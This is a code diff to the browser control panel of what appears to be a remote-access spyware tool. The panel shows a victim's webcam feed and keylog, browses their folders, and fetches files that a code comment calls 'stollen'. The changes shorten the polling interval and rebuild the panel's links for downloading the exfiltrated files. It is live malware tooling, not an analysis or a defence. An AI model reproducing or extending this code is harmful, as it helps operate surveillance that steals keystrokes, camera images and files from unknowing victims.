@@ -3,11 +3,12 @@ const video_element = document.getElementById("webcam_preview");
 const keybox = document.getElementById('keybox');
 const dirbox = document.getElementById('dirbox');
 const file_selector = document.getElementById('file_selector');
-const downloadbtn = document.getElementById('downloadbtn');
-const update_interval = 5000;
+const downloadbox = document.getElementById('downloadbox');
+const update_interval = 500;
 
 document.getElementById('refresh_file').addEventListener('click', function () {
     request('/action/get/folders')
+    request('/action/get/temp')
 });
 
 document.getElementById('back_a_dir').addEventListener('click', function () {//go back a directory button
@@ -67,10 +68,8 @@ async function request(what) {//make a request to server
 
                     case '/action/get/temp'://prototype donload stollen files from server
                         console.log('Files: ', resput)
-                        resput.forEach(file => {
-                            downloadbtn.href = 'temp/' + file;
-                            downloadbtn.click();
-                        })
+                        directoryman.build_downloads(resput)
+
                         break;
                 }
                 //return this.responseText;
@@ -103,10 +102,6 @@ async function post(what, where) {//post data to server
 
     xhttp.open("POST", where, true);
     xhttp.send(JSON.stringify(what));
-}
-
-async function submitform() {
-
 }
 
 function writeoutkeylog(keys) {//write keylog data to page
@@ -143,6 +138,8 @@ let directoryman = {
             directory.title = "download file"
             directory.addEventListener('click', function () { //download file
                 post(JSON.stringify({ action: 'download', path: fpath }), '/action/post/folders/instruct')/*Post go back instruction to server*/
+                setTimeout(()=>{request('/action/get/temp')},2000)
+                request('/action/get/temp')
             })
         }
 
@@ -152,8 +149,18 @@ let directoryman = {
 
 
     },
-    download: function (relative_filepath) {
-        downloadbtn.href = relative_filepath;//Set button to file location on server
-        downloadbtn.click();//'Click' action on the button
+    build_downloads: function (paths) {
+        downloadbox.innerHTML = ""
+        paths.forEach((path) => {
+            let link = document.createElement('a');
+            link.innerText = path;
+            link.title = "download" + path; 
+            link.href = 'temp/'+path
+            link.download = true;
+            downloadbox.appendChild(link)
+        })
+    },
+    reset:function(){
+        
     }
 }
